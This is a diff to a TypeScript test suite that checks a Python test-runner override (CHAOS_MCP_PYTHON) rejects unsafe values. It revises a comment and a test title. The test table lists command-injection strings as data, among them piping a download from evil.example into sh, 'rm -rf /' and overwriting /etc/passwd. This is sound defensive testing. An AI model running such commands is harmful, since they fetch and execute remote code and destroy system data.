@@ -388,10 +388,11 @@ describe('PythonEngine (cosmic-ray)', () => {
   describe('CHAOS_MCP_PYTHON validation', () => {
     // The override is string-concatenated into `${interpreter} -m pytest -x -q`
     // and written into the cosmic-ray config as `test-command`, which cosmic-ray
-    // executes THROUGH A SHELL once per mutant. Its doc comment called it
-    // "deterministic, used by tests" and nothing enforced that: the elaborate
-    // BARE_EXECUTABLE_RE / isRepoTestCommandAllowed gate guarded the RUNNER half
-    // of the command and left the INTERPRETER half wide open.
+    // word-splits with `shlex.split` and runs as argv — no shell — once per
+    // mutant. Its doc comment called it "deterministic, used by tests" and
+    // nothing enforced that: the elaborate BARE_EXECUTABLE_RE /
+    // isRepoTestCommandAllowed gate guarded the RUNNER half of the command and
+    // left the INTERPRETER half wide open.
     it.each([
       ['python3; curl http://evil.example | sh #'],
       ['python3 && rm -rf /'],
@@ -400,7 +401,7 @@ describe('PythonEngine (cosmic-ray)', () => {
       ['`id`'],
       ['python3 > /etc/passwd'],
       ['../../relative/python3'],
-    ])('refuses the shell-bearing override %j', async (override) => {
+    ])('refuses the unsafe override %j', async (override) => {
       process.env.CHAOS_MCP_PYTHON = override;
       const fresh = new PythonEngine();
       await expect(fresh.run('m.py', { workDir: '/tmp/sandbox' })).rejects.toThrow(
